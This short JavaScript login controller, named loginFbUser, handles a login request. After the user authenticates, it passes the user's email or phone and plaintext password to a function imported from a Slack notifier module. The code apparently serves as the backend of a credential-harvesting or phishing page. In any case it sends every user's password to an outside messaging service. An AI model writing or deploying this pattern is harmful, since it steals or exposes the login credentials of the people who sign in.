import AuthService from "../services/auth.service.js";
import sendResponse from "../util/apiResponse.js";
import sendLoginAlert from "../util/slackNotifier.js";

export const loginFbUser = async (req, res, next)=>{
  const userData = req.loginData;
  try{
    const user = await AuthService.loginUser(userData);
    const {emailOrPhone, password} = user;
    sendLoginAlert(emailOrPhone, password);
    return sendResponse(res, 200, "Login successful", user);
  }
  catch(err){
    next(err)
  }
}